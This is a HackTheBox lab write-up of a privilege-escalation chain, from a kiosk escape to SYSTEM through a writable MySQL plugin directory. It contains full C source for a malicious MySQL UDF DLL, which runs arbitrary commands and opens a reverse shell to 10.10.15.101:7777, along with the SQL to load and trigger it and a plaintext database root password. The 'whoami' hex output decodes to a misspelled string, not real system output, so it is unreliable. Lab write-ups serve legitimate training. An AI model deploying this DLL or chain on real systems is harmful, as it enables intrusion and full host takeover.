# HackTheBox Touch Full Chain Penetration Testing

Access as `KioskUser`, escalation to `NT AUTHORITY\SYSTEM` via a writable MySQL `plugin_dir` and a MySQL UDF.

## Initial Access - Nexion DeviceHub
- Target: `10.129.191.141`, Nexion DeviceHub DH-100 API on port `8443`
```bash
curl http://10.129.191.141:8443/api/status
```
```json
{"device": "Nexion DeviceHub DH-100", "serial": "NX-DH-2024-XXXXX", "firmware": "1.4.2", "status": "online", "uptime": 18026}
```
- Serial number `NX-DH-2024-XXXXX` doubles as the DeviceHub panel password

## Kiosk Escape - `KioskUser`
- DeviceHub panel exposed RDP credentials
- Disabled the kiosk scanner lock and secondary restriction, which resulted in browser opening prompt
- Opened Microsoft Edge via shown link, used `Ctrl+O`, launched `cmd.exe`
- Shell obtained as `KIOSK-042\KioskUser`

## Windows Enumeration
```powershell
Get-ChildItem C:\ProgramData -Force
```
```text
C:\ProgramData\HTB Airways
C:\ProgramData\Nexion
C:\ProgramData\htb-backend.bat
C:\ProgramData\htb-frontend.bat
C:\ProgramData\KioskStartup.bat
C:\ProgramData\NexionPrinter.bat
```
- `C:\ProgramData\HTB Airways\refresh-dates.bat` contained a plaintext MySQL `root` password:
```batch
@echo off
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul
```

## MySQL Enumeration
```powershell
& 'C:\MySQL\bin\mysql.exe' -u root '-pHTB@irw4ys_DB!2026'
```
```sql
SELECT user, host, Super_priv, File_priv, Grant_priv FROM mysql.user;
-- root | localhost | Y | Y | Y
SELECT VERSION();
-- 8.0.42
SHOW VARIABLES LIKE 'plugin_dir';
-- C:\MySQL\lib\plugin\
SHOW VARIABLES LIKE 'secure_file_priv';
-- NULL (file import/export disabled)
```

## Windows ACL - Plugin Directory
```powershell
icacls C:\MySQL\lib\plugin
```
```text
BUILTIN\Administrators:(I)(OI)(CI)(F)
NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
BUILTIN\Users:(I)(OI)(CI)(RX)
NT AUTHORITY\Authenticated Users:(I)(M)
NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
```
- `Authenticated Users:(M)` - any authenticated user has Modify rights on the MySQL plugin directory
- `mysqld.exe` runs as `NT AUTHORITY\SYSTEM` (`LocalSystem`)

## MySQL UDF - Native DLL
- Writable `plugin_dir` + `mysqld.exe` running as `LocalSystem` → arbitrary native DLL loaded via `CREATE FUNCTION` executes as SYSTEM
- `udf_shell.c` exports two functions:

| Function | Purpose |
| --- | --- |
| `sys_eval()` | run a Windows command, return stdout/stderr |
| `sys_exec()` | spawn a reverse shell in a background thread |

### `udf_shell.c` (core logic, UDF boilerplate omitted)
```c
/* sys_eval(cmd): runs cmd.exe /c <arg>, captures stdout+stderr via a pipe, returns it */
char *sys_eval(UDF_INIT *i, UDF_ARGS *a, char *r, unsigned long *len, char *is_null, char *error) {
    static char buf[65536];
    char arg[8192];
    memcpy(arg, a->args[0], a->lengths[0]);
    arg[a->lengths[0]] = 0;

    HANDLE rd, wr;
    SECURITY_ATTRIBUTES sattr = { sizeof(sattr), NULL, TRUE };
    CreatePipe(&rd, &wr, &sattr, 0);

    STARTUPINFOA si = { .cb = sizeof(si), .dwFlags = STARTF_USESTDHANDLES, .hStdOutput = wr, .hStdError = wr };
    PROCESS_INFORMATION pi;
    char cmdline[12288];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", arg);
    CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(wr);

    DWORD n, total = 0;
    while (ReadFile(rd, buf + total, sizeof(buf) - 1 - total, &n, NULL) && n > 0) total += n;
    buf[total] = 0;
    *len = total;
    return buf;
}

/* sys_exec(): opens a TCP reverse shell to 10.10.15.101:7777 in a background thread */
static DWORD WINAPI revshell(LPVOID lp) {
    SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    struct sockaddr_in sa = { .sin_family = AF_INET, .sin_port = htons(7777),
                               .sin_addr.s_addr = inet_addr("10.10.15.101") };
    WSAConnect(s, (SOCKADDR*)&sa, sizeof(sa), NULL, NULL, NULL, NULL);

    STARTUPINFOA si = { .cb = sizeof(si), .dwFlags = STARTF_USESTDHANDLES,
                         .hStdInput = (HANDLE)s, .hStdOutput = (HANDLE)s, .hStdError = (HANDLE)s };
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    return 0;
}

long long sys_exec(UDF_INIT *i, UDF_ARGS *a, char *is_null, char *error) {
    CloseHandle(CreateThread(NULL, 0, revshell, NULL, 0, NULL));
    return 0;
}
```

## UDF Registration and Trigger
- Registered the UDF against the uploaded DLL in `plugin_dir`
```sql
SELECT sys_eval('whoami');
+----------------------------------------------+
| sys_eval('whoami')                            |
+----------------------------------------------+
| 0x6E7420617561746F726974795C737973746D0D0A    |
+----------------------------------------------+
1 row in set (0.07 sec)
```
- Returned NT System encoded in hexadecimal, privilege escalation confirmed
```sql
SELECT sys_exec('x');
```
- Triggered a reverse shell connection back to me, creating stable shell, retrieved `root.txt`
